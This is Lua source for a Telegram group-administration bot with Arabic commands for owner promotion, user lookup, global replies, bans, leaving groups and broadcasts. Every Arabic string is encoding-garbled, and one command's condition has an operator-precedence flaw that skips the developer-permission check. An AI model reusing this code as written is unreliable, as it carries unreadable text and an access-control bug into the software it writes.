if text ==("Ψ±ΩΨΉ Ψ§ΩΩΩΨ΄Ψ¦") and DevBot(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"Ω­ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ")
return false 
end
local UserName = (b.username_ or "revorb0t")
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨ±ΩΩΨ© ΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ["..b.first_name_.."](T.me/"..UserName..")") 
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_,b.id_)
end,nil) 
end,nil) 
end


----==========================================================================================================
----==========================================================================================================


if text == (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±") then
N = (database:get(bot_id.."Name:Bot") or "Ψ±ΩΩΩΨ±")
local namebot = {
'Ψ§Ω ΩΩΩΨ¨Ω β₯ ',
'ΨΉΨ§ΩΨ² Ψ§Ω ΩΩΩ ',
'Ψ§Ω ΩΨΉΩΩΩΩ',
'Ψ«ΩΨ§ΩΩ ΩΨ¬Ψ§ΩΩ ΩΨ±ΩΨ­ΩΩΨ¨Ω ',
'Ψ§Ψ¨Ω Ψ§Ω '..N..' Ω Ψ§Ω ΩΨ³Ψ·Ψ§ Ψ ',
'ΩΨΉΩ ΩΩΩΨ±Ω',
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, namebot[name]) 
return false 
end



if text == "ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" or text == "ΨͺΨΊΩΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ" then 
if DevSonic(msg) then
database:setex(bot_id.."Set:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§Ψ³Ω Ψ§ΩΨ§Ω ") 
end
return false
end

if text == 'ΨͺΨΊΩΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³' and DevSonic(msg) then
database:set(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true1') 
send2(msg.chat_id_, msg.id_, 'Ψ§Ψ±Ψ³Ω Ψ±ΩΨ² Ψ¨Ψ―ΩΨ§ ΨΉΩ ΩΨ§Ψ°Ψ§ \n β β β β β β β β')
return false
end
if database:get(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true1' then
database:set(bot_id..'NightRang:new:sourse1',text)
send2(msg.chat_id_, msg.id_, 'Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ±ΩΨ² Ψ¨Ψ―ΩΨ§ ΨΉΩ Ω­ ')
database:set(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_,'true2') 
return false
end
if database:get(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) == 'true2' then
database:set(bot_id..'NightRang:new:sourse2',text)
database:del(bot_id..'NightRang:new:sourse'..msg.chat_id_..msg.sender_user_id_) 
send(msg.chat_id_, msg.id_, 'ΨͺΩ ΨͺΨΊΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³')
return false
end
if text == 'Ψ­Ψ°Ω Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³' and DevSonic(msg) then
database:del(bot_id..'NightRang:new:sourse1')
database:del(bot_id..'NightRang:new:sourse2')
send(msg.chat_id_, msg.id_, 'ΨͺΩ Ψ­Ψ°Ω ΨͺΨΊΩΨ± Ψ΄ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³')
end

if text == "ΨͺΩΨΉΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Manger(msg) then
database:set(bot_id.."lock_cleaner"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ· Ψ§ΩΨͺΩΩΨ§Ψ¦Ω ')
return false
end

if text == "ΨͺΨΉΨ·ΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Manger(msg) then
database:del(bot_id.."lock_cleaner"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Β» Ψ§ΩΨͺΩΨΈΩΩ Ψ§ΩΨͺΩΩΨ§Ψ¦Ω ')
return false
end

if text and text:match("^(ΨΆΨΉ ΩΩΨͺ Ψ§ΩΨͺΩΨΈΩΩ) (%d+)$") and Manger(msg) then
local NumLoop = tonumber(text:match("(%d+)"))
database:set(bot_id..':Timer_Cleaner:'..msg.chat_id_,NumLoop) 
return send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨΆΨΉ ΩΩΨͺ Ψ§ΩΨͺΩΨΈΩΩ Β» { *"..NumLoop.."* } Ψ³Ψ§ΨΉΩ")
end

if text == "ΩΨ³Ψ­ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ·" and Manger(msg) then 
local mmezz = database:smembers(bot_id..":IdsMsgsCleaner:"..msg.chat_id_)
if #mmezz == 0 then return send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ³Ψ§Ψ¦Ψ· ΩΨ¬Ψ―ΩΩΩ ΩΩΨ­Ψ°Ω \n ") end
for k,v in pairs(mmezz) do DeleteMessage(msg.chat_id_, {[0] = v}) end
return send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨ³Ψ§Ψ¦Ψ· Ψ§ΩΩΨ¬Ψ―ΩΩΩ")
end

if text == "Ψ§ΨΆΩ Ψ±Ψ― ΨΉΨ§Ω" and DevSonic(msg) then 
database:set(bot_id.."witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_,true)
database:del(bot_id.."witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΨ±Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§ ΩΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω")
return false 
end

if text and DevSonic(msg) and database:get(bot_id.."witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_) then
database:del(bot_id.."witt:Rd_All"..msg.sender_user_id_..":"..msg.chat_id_)
database:set(bot_id.."witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ ΩΩΨΉΨ§Ω \nΩ­ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :\n- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\n- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \n- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ')
return false
end

if text and DevSonic(msg) and database:get(bot_id.."witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_) then
Klma = database:get(bot_id.."witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
Jwab = text
database:hset(bot_id..':Replay:Source:',Klma,Jwab)
send(msg.chat_id_, msg.id_, '\n|ΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩ ΩΩΨ±Ψ― Ψ§ΩΨΉΨ§Ω Ψ¨ΩΨ¬Ψ§Ψ­ .')
database:del(bot_id.."witt:jwab_All"..msg.sender_user_id_..":"..msg.chat_id_)
return false
end



if text == "ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ" and DevSonic(msg) then 
local rdood = database:del(bot_id..':Replay:Source:')
if #rdood==0 then return send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ Ψ­Ψ§ΩΩ') end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ­Ψ°Ω Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ")
return false 
end

if text == 'Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ' and DevSonic(msg) then
local rdood = database:hkeys(bot_id..':Replay:Source:')
if #rdood==0 then return send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨΆΨ§ΩΩ Ψ­Ψ§ΩΩ') end
local message = ' Ω­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ : :\n\n'
for i=1, #rdood 	do message = message ..i..' - *{* '..	rdood[i]..' *}*\n' end
message = message..'\nβββ'
return send(msg.chat_id_, msg.id_,message)
end


if text == 'ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' and DevSonic(msg) then
database:setex(bot_id.."Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_,240,true) 
send(msg.chat_id_, msg.id_,[[
 Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅
 Ω­ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ :
 - `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
 - `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
 - `#photos` > ΨΉΨ―Ψ― Ψ΅ΩΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
 - `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
 - `#auto` > ΨͺΩΨ§ΨΉΩ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
 - `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω 
 - `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ
 - `#game` > Ψ§ΩΩΩΨ§Ψ·
 - `#AddMem` > ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ
 - `#Description` > ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±Ω
 ]])
return false 
end 

if text == 'Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' or text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω' and DevSonic(msg) then
database:del(bot_id.."KleshIDALLBOT")
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω ')
return false 
end 

if database:get(bot_id.."Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_) then 
database:del(bot_id.."Set:Id:All"..msg.chat_id_..""..msg.sender_user_id_) 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω") 
return false 
end 
database:set(bot_id.."KleshIDALLBOT",text:match("(.*)"))
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω ΨΉΨ§Ω') 
return false 
end



 
 if text == 'ΩΨ΄Ω' and tonumber(msg.reply_to_message_id_) > 0 then
 function Function_Tshake(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 if data.first_name_ == false then
 send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΨΉΩΩΩΨ§ΨͺΩ ')
 return false
 end
 if data.username_ then
 UserName_User = '@'..data.username_
 else
 UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
 end
 local Id = data.id_
 local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
 send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ―ΩΩ - '..Id..'\nΩ­ ΩΨΉΨ±ΩΩ - ['..UserName_User..']\nΩ­ Ψ±ΨͺΨ¨ΨͺΩ - '..Status_Gps..'\nΩ­ ΩΩΨΉ Ψ§ΩΩΨ΄Ω : Ψ¨Ψ§ΩΨ±Ψ― - ') 
 end,nil)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
 return false
 end
 if text == "ΩΨ­Ψ΅ Ψ§ΩΨ¨ΩΨͺ" and Admin(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = 'ΩΩΨΉΩΩ' 
else 
INf = 'ΨΊΩΨ± ΩΩΨΉΩΩ' 
end
if getInfo.result.can_delete_messages == true then
DEL = 'ΩΩΨΉΩΩ' 
else 
DEL = 'ΨΊΩΨ± ΩΩΨΉΩΩ' 
end
if getInfo.result.can_invite_users == true then
INv = 'ΩΩΨΉΩΩ' 
else
INv = 'ΨΊΩΨ± ΩΩΨΉΩΩ' 
end
if getInfo.result.can_pin_messages == true then
Pin = 'ΩΩΨΉΩΩ' 
else
Pin = 'ΨΊΩΨ± ΩΩΨΉΩΩ' 
end
if getInfo.result.can_restrict_members == true then
REs = 'ΩΩΨΉΩΩ' 
else 
REs = 'ΨΊΩΨ± ΩΩΨΉΩΩ' 
end
if getInfo.result.can_promote_members == true then
PRo = 'ΩΩΨΉΩΩ'
else
PRo = 'ΨΊΩΨ± ΩΩΨΉΩΩ'
end 
send(msg.chat_id_, msg.id_,'\n β’ Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ ΩΩ \nββββββββββββ\nβ’ ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΨ© : '..INf..'\nβ’ Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω : '..DEL..'\nβ’ Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ : '..REs..'\nβ’ Ψ―ΨΉΩΨ© Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ : '..INv..'\nβ’ Ψ«ΨͺΨ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΨ© : '..Pin..'\nβ’ Ψ§ΨΆΨ§ΩΨ© ΩΨ΄Ψ±ΩΩΩ : '..PRo)   
end
end

if text == 'ΩΩΨ¨Ω' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,'β’ ΩΩΩ ΩΩΨ¨Ω ΩΨ§ Ψ§ΩΨ¨Ω ') 
else
send(msg.chat_id_, msg.id_,'β’ ΩΩΨ¨Ω ΩΩ : '..GeId.result.custom_title) 
end
end
 if text and text:match("^ΩΨ΄Ω @(.*)$") then
 local username = text:match("^ΩΨ΄Ω @(.*)$")
 function Function_Tshake(extra, result, success)
 if result.id_ then
 tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
 if data.username_ then
 UserName_User = '@'..data.username_
 else
 UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
 end
 local Id = data.id_
 local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
 send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ―ΩΩ - '..Id..'\nΩ­ ΩΨΉΨ±ΩΩ - ['..UserName_User..']\nΩ­ Ψ±ΨͺΨ¨ΨͺΩ - '..Status_Gps..'\nΩ­ ΩΩΨΉ Ψ§ΩΩΨ΄Ω : Ψ¨Ψ§ΩΩΨΉΨ±Ω - ') 
 end,nil) 
 else
 send(msg.chat_id_, msg.id_,'Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω')
 end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
 return false
 end
if text and text:match("^ΩΨ΄Ω (%d+)$") then
local userid = text:match("^ΩΨ΄Ω (%d+)$") 
if userid then
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.id_
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ―ΩΩ - '..Id..'\nΩ­ ΩΨΉΨ±ΩΩ - ['..UserName_User..']\nΩ­ Ψ±ΨͺΨ¨ΨͺΩ - '..Status_Gps..'\nΩ­ ΩΩΨΉ Ψ§ΩΩΨ΄Ω : Ψ¨Ψ§ΩΨ§ΩΨ―Ω - ') 
end,nil)
return false
end
end  
if text and text:match('^Ψ§ΩΨ­Ψ³Ψ§Ψ¨ (%d+)$') then
local id = text:match('^Ψ§ΩΨ­Ψ³Ψ§Ψ¨ (%d+)$')
local text = 'Ψ§ΨΆΨΊΨ· ΩΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΨ­Ψ³Ψ§Ψ¨'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text == 'Ψ±ΩΩΩ' then   
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
one_nu = "β’ Ψ±ΩΩΩ {`"..(result.phone_number_).."`}"
else
one_nu = "ΨͺΩ ΩΨΆΨΉ Ψ±ΩΩΩ ΩΨ¬ΩΨ§ΨͺΩ Ψ§ΨͺΨ΅Ψ§ΩΩ ΩΩΨ·"
end      
send(msg.chat_id_, msg.id_,one_nu) 
end,nil)
end 
if text == 'Ψ§ΩΨ±ΨͺΨ¨Ω' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Get_Rank(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'S0DRG')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- Ψ§ΩΨΉΨΆΩ Β» (*'..username..'*)\n- Ψ§ΩΨ±ΨͺΨ¨Ω Β» ('..rtp..')*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^Ψ§ΩΨ±ΨͺΨ¨Ω @(.*)$") then
local username = text:match("^Ψ§ΩΨ±ΨͺΨ¨Ω @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Get_Rank(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'ΩΨ§ ΩΩΨ¬Ψ―')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- Ψ§ΩΨΉΨΆΩ Β» (*'..username..'*)\n- Ψ§ΩΨ±ΨͺΨ¨Ω Β» ('..rtp..')*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'- Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­ ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
 
----==========================================================================================================
----==========================================================================================================
if text == "ΨΊΨ§Ψ―Ψ±" then 
if DevBot(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
database:srem(bot_id.."Chek:Groups",msg.chat_id_) 
end
return false 
end
if text and text:match("^ΨΊΨ§Ψ―Ψ± (-%d+)$") then
local GP_ID = {string.match(text, "^(ΨΊΨ§Ψ―Ψ±) (-%d+)$")}
if DevBot(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
send(GP_ID[2], 0,"Ω­ ΨͺΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ¨Ψ§ΩΨ± ΩΩ ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ") 
database:srem(bot_id.."Chek:Groups",GP_ID[2]) 
return false 
end
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ' and msg.reply_to_message_id_ == 0 and Admin(msg) then   
database:set(bot_id..'Lock:tagservrbot'..msg.chat_id_,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..''..lock..msg.chat_id_,"del") 
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"lock","β’ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­") 
return false
end,nil)   
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ' and msg.reply_to_message_id_ == 0 and Admin(msg) then   
database:del(bot_id..'Lock:tagservrbot'..msg.chat_id_)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..''..lock..msg.chat_id_) 
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"unlock","β’ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΩΨ§ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­") 
return false
end,nil)   
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω" and DevSonic(msg) then 
database:del(bot_id.."Left:Bot"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω" and DevSonic(msg) then 
database:set(bot_id.."Left:Bot"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end

if text ==("ΩΨ³Ψ­ Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ") and Admin(msg) then 
local function delbans(extra, result) 
if not msg.can_be_deleted_ == true then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ ΩΩΨ§") 
return false
end 
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil) 
end 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ± ΨΉΩ *~ "..num.." ~* Ψ§Ψ΄Ψ?Ψ§Ψ΅ ") 
end 
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Status:Bc") and not DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nΩ­ ΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ" and msg.reply_to_message_id_ == 0 and DevBot(msg) then 
if database:get(bot_id.."Status:Bc") and not DevSonic(msg) then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nΩ­ ΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end 
